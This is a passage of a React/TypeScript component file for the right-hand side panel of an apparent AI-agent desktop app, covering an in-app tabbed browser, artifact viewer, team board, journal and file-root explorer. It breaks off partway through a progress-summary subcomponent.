import { useEffect, useRef, useState, type ReactNode } from "react";
import { useTranslation } from "react-i18next";
import type { TFunction } from "i18next";
// Emits the asset URL only; the worker itself loads lazily with the pdfjs chunk.
import pdfWorkerUrl from "pdfjs-dist/build/pdf.worker.min.mjs?url";
import {
  artifactVideoUrl,
  getArtifacts,
  getJournalCases,
  getRoots,
  readArtifact,
  revealArtifact,
  getBrowserProxyUrl,
  type ArtifactContent,
  type ArtifactInfo,
  type Board,
  type JournalCase,
  type RootInfo,
} from "../api";
import type { SessionInfo, TodoItem } from "../types";
import { AccessSection } from "./AccessSection";
import { BoardSection } from "./BoardPanel";
import { Icon } from "./Icon";
import { Markdown, OPEN_ARTIFACT_EVENT } from "./Markdown";
import {
  isTauri,
  onBrowserUrlChanged,
  type NativeBrowserBounds,
} from "../tauri";
type Panel = "progress" | "artifacts" | "board" | "journal" | "team" | "files";
type RailView = "inspector" | "browser";

interface BrowserTab {
  id: string;
  label: string;
  url: string;
  favicon?: string | null;
  canGoBack?: boolean;
  canGoForward?: boolean;
}

function getTabFaviconUrl(url?: string, nativeFavicon?: string | null): string | null {
  if (nativeFavicon && (nativeFavicon.startsWith("http") || nativeFavicon.startsWith("data:"))) {
    return nativeFavicon;
  }
  if (!url || url === "about:blank") return null;
  try {
    const parsed = new URL(url.startsWith("http") ? url : `https://${url}`);
    const host = parsed.hostname;
    if (!host || host === "localhost" || host === "127.0.0.1") return null;
    return `https://www.google.com/s2/favicons?domain=${host}&sz=64`;
  } catch {
    return null;
  }
}

// In-app browser search & navigation helper
function formatSearchUrl(input: string): string {
  const trimmed = input.trim();
  if (!trimmed || trimmed === "about:blank") return "";
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  if (trimmed.startsWith("localhost:") || trimmed.startsWith("127.0.0.1:") || trimmed === "localhost") {
    return `http://${trimmed}`;
  }
  if (/^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+(\/.*)?$/.test(trimmed)) {
    return `https://${trimmed}`;
  }
  return `https://www.google.com/search?q=${encodeURIComponent(trimmed)}`;
}
function kindIcon(kind: string): "file" | "fileCode" | "image" | "table" {
  if (kind === "image") return "image";
  if (kind === "html" || kind === "code") return "fileCode";
  if (kind === "csv" || kind === "sheet") return "table";
  return "file"; // markdown, text, pdf, everything else
}

// Fallback kind for an artifact: link whose path isn't in the list (yet) — mirrors the
// server's extension mapping closely enough for the viewer to pick a renderer.
function kindFromPath(path: string): string {
  const ext = (path.split(".").pop() || "").toLowerCase();
  if (["png", "jpg", "jpeg", "gif", "svg", "webp"].includes(ext)) return "image";
  if (["html", "htm"].includes(ext)) return "html";
  if (ext === "md") return "markdown";
  if (ext === "csv") return "csv";
  if (ext === "pdf") return "pdf";
  if (["mp4", "webm", "mov"].includes(ext)) return "video";
  if (["py", "js", "ts", "tsx", "jsx", "json", "sh", "css"].includes(ext)) return "code";
  return "text";
}

interface Props {
  active: boolean;
  sessionId: string;
  refreshKey: number;
  toolNames: string[];
  todo: TodoItem[];
  running: boolean;
  // Fires when a full artifact preview opens/closes, so the app can auto-collapse the left nav
  // to give the preview (PDF/webpage/sheet) more room (#3).
  onPreviewChange?: (open: boolean) => void;
  // §32: the rail is the ONE session panel for every persona. Artifacts (scratch-side
  // deliverables), Files (all roots), and Access all render for every session (UX-036/037).
  showArtifacts?: boolean;
  personaId?: string;
  projectScoped?: boolean;
  workspace?: string;
  branch?: string | null;
  scratchPrimary?: boolean;
  openAccessKey?: number;
  onOpenIntegrations?: () => void;
  // Agent teams (OPE-96): App owns board data (the plan gate needs it too);
  // the rail renders the summary section and the expand affordance.
  board?: Board | null;
  onExpandBoard?: () => void;
  onOpenBoardItem?: (id: number) => void;
  // Drawer restructure (seventeenth pass): the team lives HERE, not in the sidebar —
  // member rows + the # team chat row. `isLead` also suppresses Progress (the board
  // is the lead's progress surface).
  isLead?: boolean;
  teamMembers?: SessionInfo[];
  teamChatEnabled?: boolean;
  teamChatUnread?: number;
  onOpenTeamChat?: () => void;
  onOpenAssignee?: (s: SessionInfo) => void;
  // Bumped when a [.](board:) chip in the transcript is clicked — expands the Board section.
  openBoardKey?: number;
  onToggleRail?: () => void;
}

export function RightRail({
  active,
  sessionId,
  refreshKey,
  toolNames,
  todo,
  running,
  onPreviewChange,
  showArtifacts = true,
  personaId,
  projectScoped,
  onToggleRail,
  workspace,
  branch,
  scratchPrimary,
  openAccessKey = 0,
  onOpenIntegrations,
  board,
  onExpandBoard,
  onOpenBoardItem,
  isLead = false,
  teamMembers = [],
  teamChatEnabled = false,
  teamChatUnread = 0,
  onOpenTeamChat,
  onOpenAssignee,
  openBoardKey = 0,
}: Props) {
  const { t } = useTranslation();
  // Seventeenth pass: every panel starts collapsed and nothing auto-expands — a count
  // chip is the maximum signal. One exception survives (solo sessions only): Progress
  // still auto-opens the first time a live turn has todos.
  const [activeRailView, setActiveRailView] = useState<RailView>("inspector");
  const [browserTabs, setBrowserTabs] = useState<BrowserTab[]>([
    { id: "tab-default", label: "New tab", url: "" },
  ]);
  const [activeBrowserTabId, setActiveBrowserTabId] = useState<string>("tab-default");
  const [browserUrl, setBrowserUrl] = useState("");
  const [browserInput, setBrowserInput] = useState("");
  const [browserIframeKey, setBrowserIframeKey] = useState(0);
  const [browserHistory, setBrowserHistory] = useState<string[]>([]);
  const [browserHistoryIdx, setBrowserHistoryIdx] = useState(-1);
  const [isBrowserExpanded, setIsBrowserExpanded] = useState(false);

  const browserContainerRef = useRef<HTMLDivElement>(null);
  const hasDesktopBrowser = () => Boolean((window as any).desktop?.browser);

  useEffect(() => {
    const desktop = (window as any).desktop;
    if (activeRailView !== "browser" || !browserUrl || browserUrl === "about:blank") {
      desktop?.browser?.hide?.();
      return;
    }

    const content = browserContainerRef.current;
    if (!content) return;

    const syncBounds = () => {
      const rect = content.getBoundingClientRect();
      const bounds: NativeBrowserBounds = {
        x: Math.round(rect.x),
        y: Math.round(rect.y),
        width: Math.round(rect.width),
        height: Math.round(rect.height),
      };
      if (bounds.width < 1 || bounds.height < 1) {
        desktop?.browser?.hide?.();
        return;
      }

      if (desktop?.browser) {
        desktop.browser.show(bounds);
        desktop.browser.setBounds(bounds);
      }
    };

    syncBounds();
    const t1 = setTimeout(syncBounds, 60);
    const t2 = setTimeout(syncBounds, 180);
    const observer = new ResizeObserver(syncBounds);
    observer.observe(content);
    window.addEventListener("resize", syncBounds);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      observer.disconnect();
      window.removeEventListener("resize", syncBounds);
      desktop?.browser?.hide?.();
    };
  }, [activeRailView, browserUrl, isBrowserExpanded]);

  useEffect(() => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.onState) {
      const unsub = desktop.browser.onState((state: any) => {
        if (state?.tabs && Array.isArray(state.tabs) && state.tabs.length > 0) {
          setBrowserTabs(
            state.tabs.map((t: any) => ({
              id: t.id,
              label: t.label || (t.url && t.url !== "about:blank" ? t.url : "New tab"),
              url: t.url === "about:blank" ? "" : t.url,
              favicon: t.favicon || null,
              canGoBack: t.canGoBack,
              canGoForward: t.canGoForward,
            }))
          );
          if (state.activeTabId) {
            setActiveBrowserTabId(state.activeTabId);
            const activeTab = state.tabs.find((t: any) => t.id === state.activeTabId);
            const rawUrl = activeTab?.url && activeTab.url !== "about:blank" ? activeTab.url : "";
            setBrowserUrl(rawUrl);
            setBrowserInput(rawUrl);
          }
        } else if (state?.url && state.url !== "about:blank") {
          setBrowserUrl(state.url);
          setBrowserInput(state.url);
        }
      });
      return unsub;
    }

    if (!isTauri()) return;
    let unlisten: (() => void) | undefined;
    onBrowserUrlChanged((url) => {
      if (url && url !== "about:blank") {
        setBrowserUrl(url);
        setBrowserInput(url);
      }
    }).then((u) => {
      unlisten = u;
    });
    return () => {
      unlisten?.();
    };
  }, []);

  const navigateBrowser = (raw: string) => {
    const trimmed = raw.trim();
    if (!trimmed) return;
    const url = formatSearchUrl(trimmed);
    if (!url) return;
    setBrowserUrl(url);
    setBrowserInput(url);
    setBrowserTabs((prev) =>
      prev.map((t) =>
        t.id === activeBrowserTabId
          ? { ...t, url, label: trimmed.replace(/^https?:\/\//i, "").slice(0, 20) }
          : t
      )
    );
    const desktop = (window as any).desktop;
    if (desktop?.browser?.navigate) {
      desktop.browser.navigate(url);
    } else {
      setBrowserIframeKey((k) => k + 1);
    }
    setBrowserHistory((h) => [...h.slice(0, browserHistoryIdx + 1), url]);
    setBrowserHistoryIdx((i) => i + 1);
  };

  const createNewTab = async (url = "") => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.createTab) {
      await desktop.browser.createTab(url || "about:blank");
    } else {
      const newId = `tab_${Date.now()}`;
      const newTab: BrowserTab = { id: newId, label: "New tab", url };
      setBrowserTabs((prev) => [...prev, newTab]);
      setActiveBrowserTabId(newId);
      setBrowserUrl(url);
      setBrowserInput(url);
    }
  };

  const closeTab = async (e: React.MouseEvent, tabId: string) => {
    e.stopPropagation();
    const desktop = (window as any).desktop;
    const remaining = browserTabs.filter((t) => t.id !== tabId);

    if (remaining.length === 0) {
      if (desktop?.browser?.closeTab) {
        await desktop.browser.closeTab(tabId);
      }
      desktop?.browser?.hide?.();
      setActiveRailView("inspector");
      setBrowserTabs([{ id: `tab_${Date.now()}`, label: "New tab", url: "" }]);
      setBrowserUrl("");
      setBrowserInput("");
      window.dispatchEvent(new CustomEvent("ocw-collapse-nav"));
      window.dispatchEvent(new CustomEvent("ocw-close-rail"));
      return;
    }

    if (desktop?.browser?.closeTab) {
      await desktop.browser.closeTab(tabId);
    } else {
      setBrowserTabs(remaining);
      if (activeBrowserTabId === tabId) {
        const nextActive = remaining[remaining.length - 1];
        setActiveBrowserTabId(nextActive.id);
        setBrowserUrl(nextActive.url);
        setBrowserInput(nextActive.url);
      }
    }
  };

  const handleOpenInChrome = async (urlToOpen?: string) => {
    const target = urlToOpen || browserUrl || browserInput;
    if (!target || target === "about:blank") return;
    const desktop = (window as any).desktop;
    if (desktop?.browser?.openInChrome) {
      const res = await desktop.browser.openInChrome(target);
      if (res?.notInstalled) {
        const wantDownload = window.confirm(
          "Google Chrome was not found on your computer.\nWould you like to open the Google Chrome download page?"
        );
        if (wantDownload) {
          window.open("https://www.google.com/chrome/", "_blank");
        }
      }
      return;
    }
    window.open(target, "_blank");
  };

  const selectTab = async (tabId: string) => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.selectTab) {
      await desktop.browser.selectTab(tabId);
    } else {
      setActiveBrowserTabId(tabId);
      const tab = browserTabs.find((t) => t.id === tabId);
      if (tab) {
        setBrowserUrl(tab.url);
        setBrowserInput(tab.url);
      }
    }
  };

  const currentActiveTab = browserTabs.find((t) => t.id === activeBrowserTabId);

  const browserBack = () => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.back) {
      desktop.browser.back();
    }
    if (browserHistoryIdx > 0) {
      const nextIdx = browserHistoryIdx - 1;
      const url = browserHistory[nextIdx];
      setBrowserHistoryIdx(nextIdx);
      setBrowserUrl(url);
      setBrowserInput(url);
      setBrowserIframeKey((k) => k + 1);
    }
  };

  const browserForward = () => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.forward) {
      desktop.browser.forward();
    }
    if (browserHistoryIdx < browserHistory.length - 1) {
      const nextIdx = browserHistoryIdx + 1;
      const url = browserHistory[nextIdx];
      setBrowserHistoryIdx(nextIdx);
      setBrowserUrl(url);
      setBrowserInput(url);
      setBrowserIframeKey((k) => k + 1);
    }
  };

  const reloadBrowser = () => {
    const desktop = (window as any).desktop;
    if (desktop?.browser?.reload) {
      desktop.browser.reload();
    }
    setBrowserIframeKey((k) => k + 1);
  };

  // Seventeenth pass: every panel starts collapsed and nothing auto-expands — a count
  // chip is the maximum signal. One exception survives (solo sessions only): Progress
  // still auto-opens the first time a live turn has todos.
  const [open, setOpen] = useState<Record<Panel, boolean>>({
    progress: false,
    artifacts: false,
    board: false,
    journal: false,
    team: false,
    files: false,
  });
  const seenBoardKey = useRef(openBoardKey);
  useEffect(() => {
    if (openBoardKey === seenBoardKey.current) return;
    seenBoardKey.current = openBoardKey;
    setOpen((prev) => ({ ...prev, board: true }));
  }, [openBoardKey]);
  const [artifacts, setArtifacts] = useState<ArtifactInfo[]>([]);
  // UX-037 Files: the session's roots (workspace/scratch/grants) — the entry points of
  // the file explorer.
  const [rootDirs, setRootDirs] = useState<RootInfo[]>([]);
  const [journal, setJournal] = useState<JournalCase[]>([]);
  const [selected, setSelected] = useState<ArtifactInfo | null>(null);
  const [content, setContent] = useState<ArtifactContent | null>(null);

  const refreshArtifacts = () => getArtifacts(sessionId).then(setArtifacts).catch(() => setArtifacts([]));

  useEffect(() => {
    if (!active) return;
    if (showArtifacts) refreshArtifacts();
  }, [active, sessionId, refreshKey, showArtifacts]);

  useEffect(() => {
    if (!active) return;
    getRoots(sessionId).then(setRootDirs).catch(() => setRootDirs([]));
  }, [active, sessionId, refreshKey]);

  // Journal cases surface only when a board exists — same visibility rule as the
  // Board section, so plain sessions carry zero team chrome.
  useEffect(() => {
    if (!active || !board?.space) {
      setJournal([]);
      return;
    }
    getJournalCases().then(setJournal).catch(() => setJournal([]));
  }, [active, sessionId, refreshKey, board?.space]);

  // Switching conversations closes any open artifact — it belongs to the previous session's
  // workspace, which the new session can't (and shouldn't) read.
  useEffect(() => {
    setSelected(null);
    setContent(null);
  }, [sessionId]);

  useEffect(() => {
    setContent(null);
    if (!selected) return;
    readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
  }, [selected?.path, sessionId]);

  // Notify the app when a preview opens/closes (drives the left-nav auto-collapse).
  // Edge-triggered on the ACTUAL transition — a callback-identity change must never
  // replay "open" while the viewer sits open (that re-collapsed a nav the user had
  // just expanded; owner-hit 2026-08-21).
  const prevPreviewOpen = useRef(false);
  useEffect(() => {
    const open = !!selected;
    if (open !== prevPreviewOpen.current) {
      prevPreviewOpen.current = open;
      onPreviewChange?.(open);
    }
  }, [!!selected, onPreviewChange]);

  const reloadSelected = () => {
    if (!selected) return Promise.resolve();
    setContent(null);
    return readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
  };

  // §34 (UX-016): [Title](artifact:path) chips in the transcript open the viewer directly.
  // Resolve against the loaded list first; on a miss, refresh once (the file may be
  // seconds old), then fall back to a minimal record — readArtifact validates the path.
  // Older assistant messages may include the session ID in the link
  // (`artifact:<session-id>/relative/path`); the artifact API already scopes by session,
  // so remove that redundant prefix before resolving.
  // Registered even while the rail is HIDDEN (owner-hit 2026-08-15): the chip fires ONE
  // event, and App's unhide listener and this one race it — gating this on `active`
  // dropped the selection, so the first click only opened an empty rail.
  useEffect(() => {
    if (!sessionId) return;
    const normalizePath = (path: string) =>
      path.startsWith(`${sessionId}/`) ? path.slice(sessionId.length + 1) : path;
    const minimal = (path: string): ArtifactInfo => ({
      path,
      name: path.split("/").pop() || path,
      kind: kindFromPath(path),
      size: 0,
      modified_at: 0,
    });
    const match = (list: ArtifactInfo[], path: string) =>
      list.find((a) => a.path === path || a.path.endsWith("/" + path) || a.name === path);
    const onOpen = (e: Event) => {
      const path = normalizePath(String((e as CustomEvent).detail?.path || ""));
      if (!path) return;
      const found = match(artifacts, path);
      if (found) {
        setSelected(found);
        return;
      }
      getArtifacts(sessionId)
        .then((list) => {
          setArtifacts(list);
          setSelected(match(list, path) ?? minimal(path));
        })
        .catch(() => setSelected(minimal(path)));
    };
    window.addEventListener(OPEN_ARTIFACT_EVENT, onOpen);
    return () => window.removeEventListener(OPEN_ARTIFACT_EVENT, onOpen);
  }, [sessionId, artifacts]);
  if (!active) return null;

  return (
    <aside
      className={
        "right-rail" +
        (selected ? " artifact-mode" : "") +
        (activeRailView === "browser"
          ? " browser-mode" + (isBrowserExpanded ? " browser-expanded" : "")
          : "")
      }
    >
      {/* Top Header Mode Switcher (only show when Inspector and not viewing artifact) */}
      {!selected && activeRailView === "inspector" && (
        <div className="flex items-center justify-between border-b border-line px-3.5 h-[38px] bg-paper/40 shrink-0 select-none">
          <div className="flex items-center gap-1 bg-chromeHover/60 p-0.5 rounded-lg">
            <button
              className="px-2.5 py-0.5 rounded-md text-[12px] font-medium transition-colors bg-panel text-ink shadow-xs cursor-pointer"
              onClick={() => setActiveRailView("inspector")}
            >
              Inspector
            </button>
            <button
              className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-md text-[12px] font-medium transition-colors text-muted hover:text-ink cursor-pointer"
              onClick={() => setActiveRailView("browser")}
            >
              <Icon name="globe" size={13} />
              <span>Browser</span>
            </button>
          </div>
          {onToggleRail && (
            <button
              className="topbar-icon-btn shrink-0"
              onClick={onToggleRail}
              aria-label={t("topbar.hide_side_panel")}
              title={t("topbar.hide_side_panel")}
            >
              <Icon name="sidebarRight" size={16} />
            </button>
          )}
        </div>
      )}

      {selected ? (
        <ArtifactViewer
          sessionId={sessionId}
          artifact={selected}
          content={content}
          onReload={reloadSelected}
          onBack={() => setSelected(null)}
          onOpenEntry={(path) =>
            setSelected({
              path,
              name: path.split("/").pop() || path,
              kind: kindFromPath(path),
              size: 0,
              modified_at: 0,
              origin: selected?.origin,
            })
          }
        />
      ) : activeRailView === "browser" ? (
        /* Codex-style In-App Browser Panel */
        <div className="flex flex-col h-full min-h-0 bg-panel">
          {/* Top Tab Bar (Row 1: Tabs like Codex) */}
          <div className="flex items-center justify-between border-b border-line bg-canvas px-2 pt-1.5 shrink-0 gap-1 select-none">
            <div className="flex items-center gap-1 overflow-x-auto no-scrollbar flex-1 min-w-0">
              {browserTabs.map((tab) => {
                const isActive = tab.id === activeBrowserTabId;
                const faviconUrl = getTabFaviconUrl(tab.url, tab.favicon);
                return (
                  <div
                    key={tab.id}
                    onClick={() => selectTab(tab.id)}
                    className={
                      "group flex items-center gap-1.5 px-3 py-1.5 text-[12px] rounded-t-lg max-w-[170px] min-w-[100px] cursor-pointer transition-colors border-t border-x " +
                      (isActive
                        ? "bg-paper text-ink border-line font-medium shadow-2xs"
                        : "bg-transparent text-muted hover:text-ink hover:bg-paper/40 border-transparent")
                    }
                  >
                    <span className="flex size-4 items-center justify-center shrink-0">
                      {faviconUrl ? (
                        <img
                          src={faviconUrl}
                          alt=""
                          className="size-3.5 object-contain rounded-xs"
                          onError={(e) => {
                            e.currentTarget.style.display = "none";
                            const fallback = e.currentTarget.nextElementSibling;
                            if (fallback) (fallback as HTMLElement).style.display = "inline-flex";
                          }}
                        />
                      ) : null}
                      <Icon
                        name="globe"
                        size={13}
                        className={`text-muted ${faviconUrl ? "hidden" : ""}`}
                      />
                    </span>
                    <span className="truncate flex-1">{tab.label || "New tab"}</span>
                    <button
                      onClick={(e) => closeTab(e, tab.id)}
                      className="opacity-0 group-hover:opacity-100 hover:bg-chromeHover rounded p-0.5 text-muted hover:text-ink transition-opacity ml-0.5"
                      title="Close tab"
                    >
                      <Icon name="x" size={11} />
                    </button>
                  </div>
                );
              })}
              <button
                onClick={() => createNewTab()}
                className="flex size-6 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink transition-colors ml-0.5 shrink-0"
                title="New tab"
              >
                <Icon name="plus" size={13} />
              </button>
            </div>

            {/* Right controls: Expand & Close */}
            <div className="flex items-center gap-1 pb-1 shrink-0">
              <button
                className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink transition-colors"
                title={isBrowserExpanded ? "Thu nhỏ bảng điều khiển" : "Mở rộng bảng điều khiển"}
                onClick={() => setIsBrowserExpanded((p) => !p)}
              >
                <Icon name={isBrowserExpanded ? "collapsePanel" : "expandPanel"} size={13} />
              </button>
              <button
                className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink transition-colors"
                title="Đóng trình duyệt"
                onClick={() => {
                  const desktop = (window as any).desktop;
                  desktop?.browser?.hide?.();
                  setActiveRailView("inspector");
                  window.dispatchEvent(new CustomEvent("ocw-close-rail"));
                }}
              >
                <Icon name="x" size={14} />
              </button>
            </div>
          </div>

          {/* Navigation Bar (Row 2: Back, Forward, Reload, URL Input, More) */}
          <div className="flex items-center gap-1.5 border-b border-line px-3 py-1.5 bg-canvas shrink-0">
            <button
              className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink disabled:opacity-30 transition-colors"
              onClick={browserBack}
              disabled={currentActiveTab?.canGoBack === false && browserHistoryIdx <= 0}
              title="Back"
            >
              <Icon name="arrowLeft" size={14} />
            </button>
            <button
              className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink disabled:opacity-30 transition-colors"
              onClick={browserForward}
              disabled={currentActiveTab?.canGoForward === false && browserHistoryIdx >= browserHistory.length - 1}
              title="Forward"
            >
              <Icon name="arrowLeft" size={14} className="rotate-180" />
            </button>
            <button
              className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink transition-colors"
              onClick={reloadBrowser}
              title="Reload"
            >
              <Icon name="refresh" size={14} />
            </button>

            {/* URL / Search Input Bar */}
            <div className="flex-1 min-w-0 flex items-center gap-2 px-3 py-1.5 bg-paper border border-line rounded-lg focus-within:border-accent shadow-2xs">
              <input
                className="flex-1 min-w-0 text-[12px] text-ink bg-transparent outline-none placeholder:text-muted"
                value={browserInput}
                onChange={(e) => setBrowserInput(e.target.value)}
                onFocus={(e) => {
                  const input = e.currentTarget;
                  setTimeout(() => input.select(), 0);
                }}
                onClick={(e) => {
                  e.currentTarget.select();
                }}
                onKeyDown={(e) => {
                  if (e.key === "Enter") {
                    navigateBrowser(browserInput);
                  }
                }}
                placeholder="Enter URL"
              />
              <button
                className="text-muted hover:text-ink transition-colors shrink-0"
                title="Open in Google Chrome"
                onClick={() => {
                  const target = browserInput.trim() || browserUrl;
                  if (target && target !== "about:blank") {
                    handleOpenInChrome(target);
                  }
                }}
              >
                <Icon name="externalLink" size={13} />
              </button>
            </div>

            <button
              className="flex size-7 items-center justify-center rounded-md text-muted hover:bg-chromeHover hover:text-ink transition-colors"
              title="Open in Google Chrome"
              onClick={() => {
                const target = browserInput.trim() || browserUrl;
                if (target && target !== "about:blank") {
                  handleOpenInChrome(target);
                }
              }}
            >
              <Icon name="moreVertical" size={14} />
            </button>
          </div>

          {/* Live Browser Content / Codex Empty State */}
          <div ref={browserContainerRef} className="flex-1 min-h-0 bg-canvas relative flex flex-col">
            {(!browserUrl || browserUrl === "about:blank") ? (
              <div className="flex-1 flex flex-col items-center justify-center text-center p-8 select-none">
                <div className="flex size-14 items-center justify-center rounded-full bg-paper border border-line text-muted shadow-2xs mb-4">
                  <Icon name="globe" size={28} />
                </div>
                <h3 className="text-[16px] font-semibold text-ink mb-1.5">Start browsing</h3>
                <p className="text-[13px] text-muted max-w-[260px]">Enter a URL to open a page</p>
              </div>
            ) : (
              !hasDesktopBrowser() && (
                <iframe
                  key={browserIframeKey}
                  src={getBrowserProxyUrl(browserUrl)}
                  className="w-full flex-1 border-0"
                  sandbox="allow-scripts allow-forms allow-popups allow-modals"
                  title="In-App Browser"
                />
              )
            )}
          </div>
        </div>
      ) : (
        <div className="p-4 space-y-2">
          {!isLead && (
            <RailSection title={t("rail.progress_title")} open={open.progress} onToggle={() => setOpen({ ...open, progress: !open.progress })}>
              <ProgressSummary running={running} toolNames={toolNames} todo={todo} />
            </RailSection>
          )}

          {/* Agent teams (OPE-96): board summary — grouped by state, blocked on top.
              Hidden entirely until the workspace has items (no chrome for plain sessions). */}
          {board?.space && (
            <RailSection
              title={t("rail.board_title")}
              count={boardChip(board, t).text}
              countAttention={boardChip(board, t).attention}
              open={open.board}
              onToggle={() => setOpen({ ...open, board: !open.board })}
              action={
                <button
                  className="rail-mini-btn"
                  data-testid="board-expand"
                  onClick={(e) => {
                    e.stopPropagation();
                    onExpandBoard?.();
                  }}
                  title={t("rail.board_expand")}
                >
                  <Icon name="panelOpen" size={13} />
                </button>
              }
            >
              <BoardSection
                board={board}
                onExpand={() => onExpandBoard?.()}
                onOpenItem={onOpenBoardItem}
              />
            </RailSection>
          )}

          {/* The team panel: who's working, on what, and the way into their sessions —
              the altitude-3 escape hatch, moved here from the sidebar (RECENT keeps ONE
              entry per team: the lead). */}
          {teamMembers.length > 0 && (
            <RailSection
              title={t("rail.team_title")}
              open={open.team}
              onToggle={() => setOpen({ ...open, team: !open.team })}
              count={String(teamMembers.length)}
            >
              <div className="rail-team" data-testid="team-panel">
                {teamMembers.map((w) => (
                  <button
                    className="rail-team-row"
                    key={w.session_id}
                    data-testid={`team-row-${w.team?.actor || w.session_id}`}
                    onClick={() => onOpenAssignee?.(w)}
                    title={t("rail.team_open_session", { name: w.team?.actor || t("rail.team_worker") })}
                  >
                    <span className={"team-dot " + (w.team?.status || "idle")} />
                    <span className="rail-team-name">{w.team?.actor || w.agent}</span>
                    <span className="rail-team-item">{w.team?.current_item || t("rail.team_sleeping")}</span>
                    <span className="rail-team-open">{t("rail.team_open")}</span>
                  </button>
                ))}
                {teamChatEnabled && onOpenTeamChat && (
                  <button className="rail-team-row rail-chat-row" data-testid="team-chat-row" onClick={onOpenTeamChat}>
                    <span className="team-hash">#</span>
                    <span className="rail-team-name">{t("rail.team_chat")}</span>
                    {teamChatUnread > 0 && <span className="team-chat-badge">{teamChatUnread}</span>}
                  </button>
                )}
              </div>
            </RailSection>
          )}

          {showArtifacts && (
          <RailSection
            title={t("rail.artifacts_title")}
            count={artifacts.length ? String(artifacts.length) : undefined}
            open={open.artifacts}
            onToggle={() => setOpen({ ...open, artifacts: !open.artifacts })}
            action={
              <>
                {artifacts.length > 0 && (
                  <button
                    className="rail-mini-btn"
                    onClick={(e) => { e.stopPropagation(); revealArtifact(sessionId, artifacts[0].path, "reveal"); }}
                    title={t("rail.show_folder")}
                  >
                    <Icon name="folder" size={13} />
                  </button>
                )}
                <button className="rail-mini-btn" onClick={(e) => { e.stopPropagation(); refreshArtifacts(); }} title={t("rail.refresh")}><Icon name="refresh" size={13} /></button>
              </>
            }
          >
            {artifacts.length === 0 ? (
              <div className="rail-muted">{t("rail.artifacts_empty")}</div>
            ) : (
              <div className="artifact-list">
                {artifacts.slice(0, 16).map((a) => (
                  <button className="artifact-row" key={a.path} onClick={() => setSelected(a)}>
                    <span className="artifact-ico" title={a.kind}>
                      <Icon name={kindIcon(a.kind)} size={17} />
                    </span>
                    <span className="artifact-name">
                      {a.name}
                      <span className="artifact-row-meta">{formatBytes(a.size)} · {formatTime(a.modified_at)}</span>
                    </span>
                    <span className="artifact-open">{t("rail.open")}</span>
                  </button>
                ))}
              </div>
            )}
          </RailSection>
          )}

          {/* The More fold is gone (owner call 2026-08-20): every section lists flat,
              collapsed by default — with Files added, one extra click hid half the
              drawer for no gain. */}
          {board?.space && journal.length > 0 && (
            <RailSection
              title={t("rail.journal_title")}
              count={String(journal.length)}
              open={open.journal}
              onToggle={() => setOpen({ ...open, journal: !open.journal })}
            >
              <div className="journal-list" data-testid="journal-list">
                {journal.map((c) => (
                  <div className="journal-row" key={c.case}>
                    <Icon name="file" size={13} />
                    <span className="journal-case">{c.case}</span>
                    <span className="journal-count">{t("rail.journal_entries", { count: c.entries })}</span>
                  </div>
                ))}
              </div>
            </RailSection>
          )}
          {/* UX-037: Files — an explorer over the session's roots. Each root opens in
              the artifact viewer, whose folder listings already click through; the
              Artifacts section stays the curated scratch-only surface. */}
          {rootDirs.length > 0 && (
            <RailSection
              title={t("rail.crumb_files")}
              count={String(rootDirs.length)}
              open={open.files}
              onToggle={() => setOpen({ ...open, files: !open.files })}
            >
              <div className="artifact-list" data-testid="files-roots">
                {rootDirs.map((r) => (
                  <button
                    className="artifact-row"
                    key={r.path}
                    data-testid="files-root-row"
                    onClick={() =>
                      setSelected({
                        path: r.path,
                        abs_path: r.path,
                        name: r.label || r.path.split("/").pop() || r.path,
                        kind: "folder",
                        size: 0,
                        modified_at: 0,
                        origin: "files",
                      })
                    }
                    title={r.path}
                  >
                    <span className="artifact-ico">
                      <Icon name="folder" size={17} />
                    </span>
                    <span className="artifact-name">
                      {r.label || r.path.split("/").pop() || r.path}
                      <span className="artifact-row-meta">
                        {r.writable ? t("rail.root_read_write") : t("rail.root_read_only")}
                        {!r.exists ? ` · ${t("root.missing")}` : ""}
                      </span>
                    </span>
                    <span className="artifact-open">{t("rail.browse")}</span>
                  </button>
                ))}
              </div>
            </RailSection>
          )}

          {/* §32: Access — the former Session-settings drawer, one section among peers.
              key: its data ownership resets with the conversation, like the old row did. */}
          <div>
            <AccessSection
              key={sessionId}
              sessionId={sessionId}
              personaId={personaId}
              projectScoped={projectScoped}
              workspace={workspace}
              branch={branch}
              scratchPrimary={scratchPrimary}
              openKey={openAccessKey}
              onOpenIntegrations={onOpenIntegrations}
            />
          </div>
        </div>
      )}
    </aside>
  );
}

// The Board section's header chip: the attention states (blocked/review) when present,
// otherwise a quiet active count. Full per-state summary stays on the topbar button.
function boardChip(board: Board, t: TFunction): { text: string; attention: boolean } {
  const counts: Record<string, number> = {};
  for (const item of board.items) counts[item.state] = (counts[item.state] || 0) + 1;
  const attn: string[] = [];
  if (counts.blocked) attn.push(t("rail.board_chip_blocked", { count: counts.blocked }));
  if (counts.review) attn.push(t("rail.board_chip_review", { count: counts.review }));
  if (attn.length) return { text: attn.join(" · "), attention: true };
  const active = (counts.in_progress || 0) + (counts.open || 0);
  return { text: active ? t("rail.board_chip_active", { count: active }) : "", attention: false };
}

function ProgressSummary({ running, toolNames, todo }: { running: boolean; toolNames: string[]; todo: TodoItem[] }) {
  const { t } = useTranslation();
  if (todo.length) {
    return (
      <div className="rail-todo-list">
        {todo.map((item, index) => (
          <div className={"rail-todo " + item.status} key={index}>
            <span className="rail-todo-mark" />
            <span>{item.content}</span>
          </div>
        ))}
        {running && (
          <div className="rail-muted">
